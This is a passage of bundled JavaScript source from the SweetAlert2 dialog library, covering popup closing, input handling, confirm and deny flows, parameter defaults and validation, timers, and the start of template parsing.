    const prepareResolveValue = (resolveValue)=>{
        // When user calls Swal.close()
        if (typeof resolveValue === "undefined") return {
            isConfirmed: false,
            isDenied: false,
            isDismissed: true
        };
        return Object.assign({
            isConfirmed: false,
            isDenied: false,
            isDismissed: false
        }, resolveValue);
    };
    const handlePopupAnimation = (instance, popup, innerParams)=>{
        const container = getContainer();
        // If animation is supported, animate
        const animationIsSupported = animationEndEvent && hasCssAnimation(popup);
        if (typeof innerParams.willClose === "function") innerParams.willClose(popup);
        if (animationIsSupported) animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
        else // Otherwise, remove immediately
        removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
    };
    const animatePopup = (instance, popup, container, returnFocus, didClose)=>{
        globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
        popup.addEventListener(animationEndEvent, function(e) {
            if (e.target === popup) {
                globalState.swalCloseEventFinishedCallback();
                delete globalState.swalCloseEventFinishedCallback;
            }
        });
    };
    const triggerDidCloseAndDispose = (instance, didClose)=>{
        setTimeout(()=>{
            if (typeof didClose === "function") didClose.bind(instance.params)();
            instance._destroy();
        });
    };
    /**
   * @param {SweetAlert2} instance
   * @param {string[]} buttons
   * @param {boolean} disabled
   */ function setButtonsDisabled(instance, buttons, disabled) {
        const domCache = privateProps.domCache.get(instance);
        buttons.forEach((button)=>{
            domCache[button].disabled = disabled;
        });
    }
    /**
   * @param {HTMLInputElement} input
   * @param {boolean} disabled
   */ function setInputDisabled(input, disabled) {
        if (!input) return;
        if (input.type === "radio") {
            const radiosContainer = input.parentNode.parentNode;
            const radios = radiosContainer.querySelectorAll("input");
            for(let i = 0; i < radios.length; i++)radios[i].disabled = disabled;
        } else input.disabled = disabled;
    }
    function enableButtons() {
        setButtonsDisabled(this, [
            "confirmButton",
            "denyButton",
            "cancelButton"
        ], false);
    }
    function disableButtons() {
        setButtonsDisabled(this, [
            "confirmButton",
            "denyButton",
            "cancelButton"
        ], true);
    }
    function enableInput() {
        setInputDisabled(this.getInput(), false);
    }
    function disableInput() {
        setInputDisabled(this.getInput(), true);
    }
    /**
   * Show block with validation message
   *
   * @param {string} error
   */ function showValidationMessage(error) {
        const domCache = privateProps.domCache.get(this);
        const params = privateProps.innerParams.get(this);
        setInnerHtml(domCache.validationMessage, error);
        domCache.validationMessage.className = swalClasses["validation-message"];
        if (params.customClass && params.customClass.validationMessage) addClass(domCache.validationMessage, params.customClass.validationMessage);
        show(domCache.validationMessage);
        const input = this.getInput();
        if (input) {
            input.setAttribute("aria-invalid", true);
            input.setAttribute("aria-describedby", swalClasses["validation-message"]);
            focusInput(input);
            addClass(input, swalClasses.inputerror);
        }
    }
    /**
   * Hide block with validation message
   */ function resetValidationMessage() {
        const domCache = privateProps.domCache.get(this);
        if (domCache.validationMessage) hide(domCache.validationMessage);
        const input = this.getInput();
        if (input) {
            input.removeAttribute("aria-invalid");
            input.removeAttribute("aria-describedby");
            removeClass(input, swalClasses.inputerror);
        }
    }
    const defaultParams = {
        title: "",
        titleText: "",
        text: "",
        html: "",
        footer: "",
        icon: undefined,
        iconColor: undefined,
        iconHtml: undefined,
        template: undefined,
        toast: false,
        showClass: {
            popup: "swal2-show",
            backdrop: "swal2-backdrop-show",
            icon: "swal2-icon-show"
        },
        hideClass: {
            popup: "swal2-hide",
            backdrop: "swal2-backdrop-hide",
            icon: "swal2-icon-hide"
        },
        customClass: {},
        target: "body",
        color: undefined,
        backdrop: true,
        heightAuto: true,
        allowOutsideClick: true,
        allowEscapeKey: true,
        allowEnterKey: true,
        stopKeydownPropagation: true,
        keydownListenerCapture: false,
        showConfirmButton: true,
        showDenyButton: false,
        showCancelButton: false,
        preConfirm: undefined,
        preDeny: undefined,
        confirmButtonText: "OK",
        confirmButtonAriaLabel: "",
        confirmButtonColor: undefined,
        denyButtonText: "No",
        denyButtonAriaLabel: "",
        denyButtonColor: undefined,
        cancelButtonText: "Cancel",
        cancelButtonAriaLabel: "",
        cancelButtonColor: undefined,
        buttonsStyling: true,
        reverseButtons: false,
        focusConfirm: true,
        focusDeny: false,
        focusCancel: false,
        returnFocus: true,
        showCloseButton: false,
        closeButtonHtml: "&times;",
        closeButtonAriaLabel: "Close this dialog",
        loaderHtml: "",
        showLoaderOnConfirm: false,
        showLoaderOnDeny: false,
        imageUrl: undefined,
        imageWidth: undefined,
        imageHeight: undefined,
        imageAlt: "",
        timer: undefined,
        timerProgressBar: false,
        width: undefined,
        padding: undefined,
        background: undefined,
        input: undefined,
        inputPlaceholder: "",
        inputLabel: "",
        inputValue: "",
        inputOptions: {},
        inputAutoTrim: true,
        inputAttributes: {},
        inputValidator: undefined,
        returnInputValueOnDeny: false,
        validationMessage: undefined,
        grow: false,
        position: "center",
        progressSteps: [],
        currentProgressStep: undefined,
        progressStepsDistance: undefined,
        willOpen: undefined,
        didOpen: undefined,
        didRender: undefined,
        willClose: undefined,
        didClose: undefined,
        didDestroy: undefined,
        scrollbarPadding: true
    };
    const updatableParams = [
        "allowEscapeKey",
        "allowOutsideClick",
        "background",
        "buttonsStyling",
        "cancelButtonAriaLabel",
        "cancelButtonColor",
        "cancelButtonText",
        "closeButtonAriaLabel",
        "closeButtonHtml",
        "color",
        "confirmButtonAriaLabel",
        "confirmButtonColor",
        "confirmButtonText",
        "currentProgressStep",
        "customClass",
        "denyButtonAriaLabel",
        "denyButtonColor",
        "denyButtonText",
        "didClose",
        "didDestroy",
        "footer",
        "hideClass",
        "html",
        "icon",
        "iconColor",
        "iconHtml",
        "imageAlt",
        "imageHeight",
        "imageUrl",
        "imageWidth",
        "preConfirm",
        "preDeny",
        "progressSteps",
        "returnFocus",
        "reverseButtons",
        "showCancelButton",
        "showCloseButton",
        "showConfirmButton",
        "showDenyButton",
        "text",
        "title",
        "titleText",
        "willClose"
    ];
    const deprecatedParams = {};
    const toastIncompatibleParams = [
        "allowOutsideClick",
        "allowEnterKey",
        "backdrop",
        "focusConfirm",
        "focusDeny",
        "focusCancel",
        "returnFocus",
        "heightAuto",
        "keydownListenerCapture"
    ];
    /**
   * Is valid parameter
   *
   * @param {string} paramName
   * @returns {boolean}
   */ const isValidParameter = (paramName)=>{
        return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
    };
    /**
   * Is valid parameter for Swal.update() method
   *
   * @param {string} paramName
   * @returns {boolean}
   */ const isUpdatableParameter = (paramName)=>{
        return updatableParams.indexOf(paramName) !== -1;
    };
    /**
   * Is deprecated parameter
   *
   * @param {string} paramName
   * @returns {string | undefined}
   */ const isDeprecatedParameter = (paramName)=>{
        return deprecatedParams[paramName];
    };
    /**
   * @param {string} param
   */ const checkIfParamIsValid = (param)=>{
        if (!isValidParameter(param)) warn(`Unknown parameter "${param}"`);
    };
    /**
   * @param {string} param
   */ const checkIfToastParamIsValid = (param)=>{
        if (toastIncompatibleParams.includes(param)) warn(`The parameter "${param}" is incompatible with toasts`);
    };
    /**
   * @param {string} param
   */ const checkIfParamIsDeprecated = (param)=>{
        if (isDeprecatedParameter(param)) warnAboutDeprecation(param, isDeprecatedParameter(param));
    };
    /**
   * Show relevant warnings for given params
   *
   * @param {SweetAlertOptions} params
   */ const showWarningsForParams = (params)=>{
        if (params.backdrop === false && params.allowOutsideClick) warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
        for(const param in params){
            checkIfParamIsValid(param);
            if (params.toast) checkIfToastParamIsValid(param);
            checkIfParamIsDeprecated(param);
        }
    };
    /**
   * Updates popup parameters.
   *
   * @param {SweetAlertOptions} params
   */ function update(params) {
        const popup = getPopup();
        const innerParams = privateProps.innerParams.get(this);
        if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
            warn(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
            return;
        }
        const validUpdatableParams = filterValidParams(params);
        const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
        render(this, updatedParams);
        privateProps.innerParams.set(this, updatedParams);
        Object.defineProperties(this, {
            params: {
                value: Object.assign({}, this.params, params),
                writable: false,
                enumerable: true
            }
        });
    }
    /**
   * @param {SweetAlertOptions} params
   * @returns {SweetAlertOptions}
   */ const filterValidParams = (params)=>{
        const validUpdatableParams = {};
        Object.keys(params).forEach((param)=>{
            if (isUpdatableParameter(param)) validUpdatableParams[param] = params[param];
            else warn(`Invalid parameter to update: ${param}`);
        });
        return validUpdatableParams;
    };
    /**
   * Dispose the current SweetAlert2 instance
   */ function _destroy() {
        const domCache = privateProps.domCache.get(this);
        const innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
            disposeWeakMaps(this); // The WeakMaps might have been partly destroyed, we must recall it to dispose any remaining WeakMaps #2335
            return; // This instance has already been destroyed
        }
        // Check if there is another Swal closing
        if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
            globalState.swalCloseEventFinishedCallback();
            delete globalState.swalCloseEventFinishedCallback;
        }
        if (typeof innerParams.didDestroy === "function") innerParams.didDestroy();
        disposeSwal(this);
    }
    /**
   * @param {SweetAlert2} instance
   */ const disposeSwal = (instance)=>{
        disposeWeakMaps(instance);
        // Unset this.params so GC will dispose it (#1569)
        // @ts-ignore
        delete instance.params;
        // Unset globalState props so GC will dispose globalState (#1569)
        delete globalState.keydownHandler;
        delete globalState.keydownTarget;
        // Unset currentInstance
        delete globalState.currentInstance;
    };
    /**
   * @param {SweetAlert2} instance
   */ const disposeWeakMaps = (instance)=>{
        // If the current instance is awaiting a promise result, we keep the privateMethods to call them once the promise result is retrieved #2335
        // @ts-ignore
        if (instance.isAwaitingPromise()) {
            unsetWeakMaps(privateProps, instance);
            privateProps.awaitingPromise.set(instance, true);
        } else {
            unsetWeakMaps(privateMethods, instance);
            unsetWeakMaps(privateProps, instance);
        }
    };
    /**
   * @param {object} obj
   * @param {SweetAlert2} instance
   */ const unsetWeakMaps = (obj, instance)=>{
        for(const i in obj)obj[i].delete(instance);
    };
    var instanceMethods = /*#__PURE__*/ Object.freeze({
        __proto__: null,
        hideLoading: hideLoading,
        disableLoading: hideLoading,
        getInput: getInput,
        close: close,
        isAwaitingPromise: isAwaitingPromise,
        rejectPromise: rejectPromise,
        handleAwaitingPromise: handleAwaitingPromise,
        closePopup: close,
        closeModal: close,
        closeToast: close,
        enableButtons: enableButtons,
        disableButtons: disableButtons,
        enableInput: enableInput,
        disableInput: disableInput,
        showValidationMessage: showValidationMessage,
        resetValidationMessage: resetValidationMessage,
        update: update,
        _destroy: _destroy
    });
    /**
   * Shows loader (spinner), this is useful with AJAX requests.
   * By default the loader be shown instead of the "Confirm" button.
   */ const showLoading = (buttonToReplace)=>{
        let popup = getPopup();
        if (!popup) new Swal(); // eslint-disable-line no-new
        popup = getPopup();
        const loader = getLoader();
        if (isToast()) hide(getIcon());
        else replaceButton(popup, buttonToReplace);
        show(loader);
        popup.setAttribute("data-loading", "true");
        popup.setAttribute("aria-busy", "true");
        popup.focus();
    };
    const replaceButton = (popup, buttonToReplace)=>{
        const actions = getActions();
        const loader = getLoader();
        if (!buttonToReplace && isVisible$1(getConfirmButton())) buttonToReplace = getConfirmButton();
        show(actions);
        if (buttonToReplace) {
            hide(buttonToReplace);
            loader.setAttribute("data-button-to-replace", buttonToReplace.className);
        }
        loader.parentNode.insertBefore(loader, buttonToReplace);
        addClass([
            popup,
            actions
        ], swalClasses.loading);
    };
    /**
   * @typedef { string | number | boolean } InputValue
   */ /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const handleInputOptionsAndValue = (instance, params)=>{
        if (params.input === "select" || params.input === "radio") handleInputOptions(instance, params);
        else if ([
            "text",
            "email",
            "number",
            "tel",
            "textarea"
        ].includes(params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
            showLoading(getConfirmButton());
            handleInputValue(instance, params);
        }
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} innerParams
   * @returns {string | number | File | FileList | null}
   */ const getInputValue = (instance, innerParams)=>{
        const input = instance.getInput();
        if (!input) return null;
        switch(innerParams.input){
            case "checkbox":
                return getCheckboxValue(input);
            case "radio":
                return getRadioValue(input);
            case "file":
                return getFileValue(input);
            default:
                return innerParams.inputAutoTrim ? input.value.trim() : input.value;
        }
    };
    /**
   * @param {HTMLInputElement} input
   * @returns {number}
   */ const getCheckboxValue = (input)=>input.checked ? 1 : 0;
    /**
   * @param {HTMLInputElement} input
   * @returns {string | null}
   */ const getRadioValue = (input)=>input.checked ? input.value : null;
    /**
   * @param {HTMLInputElement} input
   * @returns {FileList | File | null}
   */ const getFileValue = (input)=>input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const handleInputOptions = (instance, params)=>{
        const popup = getPopup();
        /**
     * @param {Record<string, any>} inputOptions
     */ const processInputOptions = (inputOptions)=>{
            populateInputOptions[params.input](popup, formatInputOptions(inputOptions), params);
        };
        if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
            showLoading(getConfirmButton());
            asPromise(params.inputOptions).then((inputOptions)=>{
                instance.hideLoading();
                processInputOptions(inputOptions);
            });
        } else if (typeof params.inputOptions === "object") processInputOptions(params.inputOptions);
        else error(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const handleInputValue = (instance, params)=>{
        const input = instance.getInput();
        hide(input);
        asPromise(params.inputValue).then((inputValue)=>{
            input.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
            show(input);
            input.focus();
            instance.hideLoading();
        }).catch((err)=>{
            error(`Error in inputValue promise: ${err}`);
            input.value = "";
            show(input);
            input.focus();
            instance.hideLoading();
        });
    };
    const populateInputOptions = {
        /**
     * @param {HTMLElement} popup
     * @param {Record<string, any>} inputOptions
     * @param {SweetAlertOptions} params
     */ select: (popup, inputOptions, params)=>{
            const select = getDirectChildByClass(popup, swalClasses.select);
            /**
       * @param {HTMLElement} parent
       * @param {string} optionLabel
       * @param {string} optionValue
       */ const renderOption = (parent, optionLabel, optionValue)=>{
                const option = document.createElement("option");
                option.value = optionValue;
                setInnerHtml(option, optionLabel);
                option.selected = isSelected(optionValue, params.inputValue);
                parent.appendChild(option);
            };
            inputOptions.forEach((inputOption)=>{
                const optionValue = inputOption[0];
                const optionLabel = inputOption[1];
                // <optgroup> spec:
                // https://www.w3.org/TR/html401/interact/forms.html#h-17.6
                // "...all OPTGROUP elements must be specified directly within a SELECT element (i.e., groups may not be nested)..."
                // check whether this is a <optgroup>
                if (Array.isArray(optionLabel)) {
                    // if it is an array, then it is an <optgroup>
                    const optgroup = document.createElement("optgroup");
                    optgroup.label = optionValue;
                    optgroup.disabled = false; // not configurable for now
                    select.appendChild(optgroup);
                    optionLabel.forEach((o)=>renderOption(optgroup, o[1], o[0]));
                } else // case of <option>
                renderOption(select, optionLabel, optionValue);
            });
            select.focus();
        },
        /**
     * @param {HTMLElement} popup
     * @param {Record<string, any>} inputOptions
     * @param {SweetAlertOptions} params
     */ radio: (popup, inputOptions, params)=>{
            const radio = getDirectChildByClass(popup, swalClasses.radio);
            inputOptions.forEach((inputOption)=>{
                const radioValue = inputOption[0];
                const radioLabel = inputOption[1];
                const radioInput = document.createElement("input");
                const radioLabelElement = document.createElement("label");
                radioInput.type = "radio";
                radioInput.name = swalClasses.radio;
                radioInput.value = radioValue;
                if (isSelected(radioValue, params.inputValue)) radioInput.checked = true;
                const label = document.createElement("span");
                setInnerHtml(label, radioLabel);
                label.className = swalClasses.label;
                radioLabelElement.appendChild(radioInput);
                radioLabelElement.appendChild(label);
                radio.appendChild(radioLabelElement);
            });
            const radios = radio.querySelectorAll("input");
            if (radios.length) radios[0].focus();
        }
    };
    /**
   * Converts `inputOptions` into an array of `[value, label]`s
   *
   * @param {Record<string, any>} inputOptions
   * @returns {Array<Array<string>>}
   */ const formatInputOptions = (inputOptions)=>{
        const result = [];
        if (typeof Map !== "undefined" && inputOptions instanceof Map) inputOptions.forEach((value, key)=>{
            let valueFormatted = value;
            if (typeof valueFormatted === "object") // case of <optgroup>
            valueFormatted = formatInputOptions(valueFormatted);
            result.push([
                key,
                valueFormatted
            ]);
        });
        else Object.keys(inputOptions).forEach((key)=>{
            let valueFormatted = inputOptions[key];
            if (typeof valueFormatted === "object") // case of <optgroup>
            valueFormatted = formatInputOptions(valueFormatted);
            result.push([
                key,
                valueFormatted
            ]);
        });
        return result;
    };
    /**
   * @param {string} optionValue
   * @param {InputValue | Promise<InputValue> | { toPromise: () => InputValue }} inputValue
   * @returns {boolean}
   */ const isSelected = (optionValue, inputValue)=>{
        return inputValue && inputValue.toString() === optionValue.toString();
    };
    /**
   * @param {SweetAlert2} instance
   */ const handleConfirmButtonClick = (instance)=>{
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.input) handleConfirmOrDenyWithInput(instance, "confirm");
        else confirm(instance, true);
    };
    /**
   * @param {SweetAlert2} instance
   */ const handleDenyButtonClick = (instance)=>{
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.returnInputValueOnDeny) handleConfirmOrDenyWithInput(instance, "deny");
        else deny(instance, false);
    };
    /**
   * @param {SweetAlert2} instance
   * @param {Function} dismissWith
   */ const handleCancelButtonClick = (instance, dismissWith)=>{
        instance.disableButtons();
        dismissWith(DismissReason.cancel);
    };
    /**
   * @param {SweetAlert2} instance
   * @param {'confirm' | 'deny'} type
   */ const handleConfirmOrDenyWithInput = (instance, type)=>{
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams.input) {
            error(`The "input" parameter is needed to be set when using returnInputValueOn${capitalizeFirstLetter(type)}`);
            return;
        }
        const inputValue = getInputValue(instance, innerParams);
        if (innerParams.inputValidator) handleInputValidator(instance, inputValue, type);
        else if (!instance.getInput().checkValidity()) {
            instance.enableButtons();
            instance.showValidationMessage(innerParams.validationMessage);
        } else if (type === "deny") deny(instance, inputValue);
        else confirm(instance, inputValue);
    };
    /**
   * @param {SweetAlert2} instance
   * @param {string | number | File | FileList | null} inputValue
   * @param {'confirm' | 'deny'} type
   */ const handleInputValidator = (instance, inputValue, type)=>{
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableInput();
        const validationPromise = Promise.resolve().then(()=>asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
        validationPromise.then((validationMessage)=>{
            instance.enableButtons();
            instance.enableInput();
            if (validationMessage) instance.showValidationMessage(validationMessage);
            else if (type === "deny") deny(instance, inputValue);
            else confirm(instance, inputValue);
        });
    };
    /**
   * @param {SweetAlert2} instance
   * @param {any} value
   */ const deny = (instance, value)=>{
        const innerParams = privateProps.innerParams.get(instance || undefined);
        if (innerParams.showLoaderOnDeny) showLoading(getDenyButton());
        if (innerParams.preDeny) {
            privateProps.awaitingPromise.set(instance || undefined, true); // Flagging the instance as awaiting a promise so it's own promise's reject/resolve methods doesn't get destroyed until the result from this preDeny's promise is received
            const preDenyPromise = Promise.resolve().then(()=>asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
            preDenyPromise.then((preDenyValue)=>{
                if (preDenyValue === false) {
                    instance.hideLoading();
                    handleAwaitingPromise(instance);
                } else instance.close({
                    isDenied: true,
                    value: typeof preDenyValue === "undefined" ? value : preDenyValue
                });
            }).catch((error)=>rejectWith(instance || undefined, error));
        } else instance.close({
            isDenied: true,
            value
        });
    };
    /**
   * @param {SweetAlert2} instance
   * @param {any} value
   */ const succeedWith = (instance, value)=>{
        instance.close({
            isConfirmed: true,
            value
        });
    };
    /**
   *
   * @param {SweetAlert2} instance
   * @param {string} error
   */ const rejectWith = (instance, error)=>{
        // @ts-ignore
        instance.rejectPromise(error);
    };
    /**
   *
   * @param {SweetAlert2} instance
   * @param {any} value
   */ const confirm = (instance, value)=>{
        const innerParams = privateProps.innerParams.get(instance || undefined);
        if (innerParams.showLoaderOnConfirm) showLoading();
        if (innerParams.preConfirm) {
            instance.resetValidationMessage();
            privateProps.awaitingPromise.set(instance || undefined, true); // Flagging the instance as awaiting a promise so it's own promise's reject/resolve methods doesn't get destroyed until the result from this preConfirm's promise is received
            const preConfirmPromise = Promise.resolve().then(()=>asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
            preConfirmPromise.then((preConfirmValue)=>{
                if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
                    instance.hideLoading();
                    handleAwaitingPromise(instance);
                } else succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
            }).catch((error)=>rejectWith(instance || undefined, error));
        } else succeedWith(instance, value);
    };
    const handlePopupClick = (instance, domCache, dismissWith)=>{
        const innerParams = privateProps.innerParams.get(instance);
        if (innerParams.toast) handleToastClick(instance, domCache, dismissWith);
        else {
            // Ignore click events that had mousedown on the popup but mouseup on the container
            // This can happen when the user drags a slider
            handleModalMousedown(domCache);
            // Ignore click events that had mousedown on the container but mouseup on the popup
            handleContainerMousedown(domCache);
            handleModalClick(instance, domCache, dismissWith);
        }
    };
    const handleToastClick = (instance, domCache, dismissWith)=>{
        // Closing toast by internal click
        domCache.popup.onclick = ()=>{
            const innerParams = privateProps.innerParams.get(instance);
            if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) return;
            dismissWith(DismissReason.close);
        };
    };
    /**
   * @param {*} innerParams
   * @returns {boolean}
   */ const isAnyButtonShown = (innerParams)=>{
        return innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton;
    };
    let ignoreOutsideClick = false;
    const handleModalMousedown = (domCache)=>{
        domCache.popup.onmousedown = ()=>{
            domCache.container.onmouseup = function(e) {
                domCache.container.onmouseup = undefined;
                // We only check if the mouseup target is the container because usually it doesn't
                // have any other direct children aside of the popup
                if (e.target === domCache.container) ignoreOutsideClick = true;
            };
        };
    };
    const handleContainerMousedown = (domCache)=>{
        domCache.container.onmousedown = ()=>{
            domCache.popup.onmouseup = function(e) {
                domCache.popup.onmouseup = undefined;
                // We also need to check if the mouseup target is a child of the popup
                if (e.target === domCache.popup || domCache.popup.contains(e.target)) ignoreOutsideClick = true;
            };
        };
    };
    const handleModalClick = (instance, domCache, dismissWith)=>{
        domCache.container.onclick = (e)=>{
            const innerParams = privateProps.innerParams.get(instance);
            if (ignoreOutsideClick) {
                ignoreOutsideClick = false;
                return;
            }
            if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) dismissWith(DismissReason.backdrop);
        };
    };
    const isJqueryElement = (elem)=>typeof elem === "object" && elem.jquery;
    const isElement = (elem)=>elem instanceof Element || isJqueryElement(elem);
    const argsToParams = (args)=>{
        const params = {};
        if (typeof args[0] === "object" && !isElement(args[0])) Object.assign(params, args[0]);
        else [
            "title",
            "html",
            "icon"
        ].forEach((name, index)=>{
            const arg = args[index];
            if (typeof arg === "string" || isElement(arg)) params[name] = arg;
            else if (arg !== undefined) error(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
        });
        return params;
    };
    function fire() {
        const Swal = this; // eslint-disable-line @typescript-eslint/no-this-alias
        for(var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++)args[_key] = arguments[_key];
        return new Swal(...args);
    }
    /**
   * Returns an extended version of `Swal` containing `params` as defaults.
   * Useful for reusing Swal configuration.
   *
   * For example:
   *
   * Before:
   * const textPromptOptions = { input: 'text', showCancelButton: true }
   * const {value: firstName} = await Swal.fire({ ...textPromptOptions, title: 'What is your first name?' })
   * const {value: lastName} = await Swal.fire({ ...textPromptOptions, title: 'What is your last name?' })
   *
   * After:
   * const TextPrompt = Swal.mixin({ input: 'text', showCancelButton: true })
   * const {value: firstName} = await TextPrompt('What is your first name?')
   * const {value: lastName} = await TextPrompt('What is your last name?')
   *
   * @param mixinParams
   */ function mixin(mixinParams) {
        class MixinSwal extends this {
            _main(params, priorityMixinParams) {
                return super._main(params, Object.assign({}, mixinParams, priorityMixinParams));
            }
        }
        return MixinSwal;
    }
    /**
   * If `timer` parameter is set, returns number of milliseconds of timer remained.
   * Otherwise, returns undefined.
   *
   * @returns {number | undefined}
   */ const getTimerLeft = ()=>{
        return globalState.timeout && globalState.timeout.getTimerLeft();
    };
    /**
   * Stop timer. Returns number of milliseconds of timer remained.
   * If `timer` parameter isn't set, returns undefined.
   *
   * @returns {number | undefined}
   */ const stopTimer = ()=>{
        if (globalState.timeout) {
            stopTimerProgressBar();
            return globalState.timeout.stop();
        }
    };
    /**
   * Resume timer. Returns number of milliseconds of timer remained.
   * If `timer` parameter isn't set, returns undefined.
   *
   * @returns {number | undefined}
   */ const resumeTimer = ()=>{
        if (globalState.timeout) {
            const remaining = globalState.timeout.start();
            animateTimerProgressBar(remaining);
            return remaining;
        }
    };
    /**
   * Resume timer. Returns number of milliseconds of timer remained.
   * If `timer` parameter isn't set, returns undefined.
   *
   * @returns {number | undefined}
   */ const toggleTimer = ()=>{
        const timer = globalState.timeout;
        return timer && (timer.running ? stopTimer() : resumeTimer());
    };
    /**
   * Increase timer. Returns number of milliseconds of an updated timer.
   * If `timer` parameter isn't set, returns undefined.
   *
   * @param {number} n
   * @returns {number | undefined}
   */ const increaseTimer = (n)=>{
        if (globalState.timeout) {
            const remaining = globalState.timeout.increase(n);
            animateTimerProgressBar(remaining, true);
            return remaining;
        }
    };
    /**
   * Check if timer is running. Returns true if timer is running
   * or false if timer is paused or stopped.
   * If `timer` parameter isn't set, returns undefined
   *
   * @returns {boolean}
   */ const isTimerRunning = ()=>{
        return globalState.timeout && globalState.timeout.isRunning();
    };
    let bodyClickListenerAdded = false;
    const clickHandlers = {};
    /**
   * @param {string} attr
   */ function bindClickHandler() {
        let attr = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : "data-swal-template";
        clickHandlers[attr] = this;
        if (!bodyClickListenerAdded) {
            document.body.addEventListener("click", bodyClickListener);
            bodyClickListenerAdded = true;
        }
    }
    const bodyClickListener = (event)=>{
        for(let el = event.target; el && el !== document; el = el.parentNode)for(const attr in clickHandlers){
            const template = el.getAttribute(attr);
            if (template) {
                clickHandlers[attr].fire({
                    template
                });
                return;
            }
        }
    };
    var staticMethods = /*#__PURE__*/ Object.freeze({
        __proto__: null,
        isValidParameter: isValidParameter,
        isUpdatableParameter: isUpdatableParameter,
        isDeprecatedParameter: isDeprecatedParameter,
        argsToParams: argsToParams,
        getContainer: getContainer,
        getPopup: getPopup,
        getTitle: getTitle,
        getHtmlContainer: getHtmlContainer,
        getImage: getImage,
        getIcon: getIcon,
        getIconContent: getIconContent,
        getInputLabel: getInputLabel,
        getCloseButton: getCloseButton,
        getActions: getActions,
        getConfirmButton: getConfirmButton,
        getDenyButton: getDenyButton,
        getCancelButton: getCancelButton,
        getLoader: getLoader,
        getFooter: getFooter,
        getTimerProgressBar: getTimerProgressBar,
        getFocusableElements: getFocusableElements,
        getValidationMessage: getValidationMessage,
        getProgressSteps: getProgressSteps,
        isLoading: isLoading,
        isVisible: isVisible,
        clickConfirm: clickConfirm,
        clickDeny: clickDeny,
        clickCancel: clickCancel,
        fire: fire,
        mixin: mixin,
        showLoading: showLoading,
        enableLoading: showLoading,
        getTimerLeft: getTimerLeft,
        stopTimer: stopTimer,
        resumeTimer: resumeTimer,
        toggleTimer: toggleTimer,
        increaseTimer: increaseTimer,
        isTimerRunning: isTimerRunning,
        bindClickHandler: bindClickHandler
    });
    class Timer {
        /**
     * @param {Function} callback
     * @param {number} delay
     */ constructor(callback, delay){
            this.callback = callback;
            this.remaining = delay;
            this.running = false;
            this.start();
        }
        start() {
            if (!this.running) {
                this.running = true;
                this.started = new Date();
                this.id = setTimeout(this.callback, this.remaining);
            }
            return this.remaining;
        }
        stop() {
            if (this.running) {
                this.running = false;
                clearTimeout(this.id);
                this.remaining -= new Date().getTime() - this.started.getTime();
            }
            return this.remaining;
        }
        increase(n) {
            const running = this.running;
            if (running) this.stop();
            this.remaining += n;
            if (running) this.start();
            return this.remaining;
        }
        getTimerLeft() {
            if (this.running) {
                this.stop();
                this.start();
            }
            return this.remaining;
        }
        isRunning() {
            return this.running;
        }
    }
    const swalStringParams = [
        "swal-title",
        "swal-html",
        "swal-footer"
    ];
    /**
   * @param {SweetAlertOptions} params
   * @returns {SweetAlertOptions}
   */ const getTemplateParams = (params)=>{
        /** @type {HTMLTemplateElement} */ const template = typeof params.template === "string" ? document.querySelector(params.template) : params.template;
        if (!template) return {};
        /** @type {DocumentFragment} */ const templateContent = template.content;
        showWarningsForElements(templateContent);
        const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {SweetAlertOptions}
   */ const getSwalParams = (templateContent)=>{
        const result = {};
        /** @type {HTMLElement[]} */ const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
        swalParams.forEach((param)=>{
            showWarningsForAttributes(param, [
                "name",
                "value"
            ]);
            const paramName = param.getAttribute("name");
            const value = param.getAttribute("value");
            if (typeof defaultParams[paramName] === "boolean") result[paramName] = value !== "false";
            else if (typeof defaultParams[paramName] === "object") result[paramName] = JSON.parse(value);
            else result[paramName] = value;
        });
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {SweetAlertOptions}
   */ const getSwalFunctionParams = (templateContent)=>{
        const result = {};
        /** @type {HTMLElement[]} */ const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
        swalFunctions.forEach((param)=>{
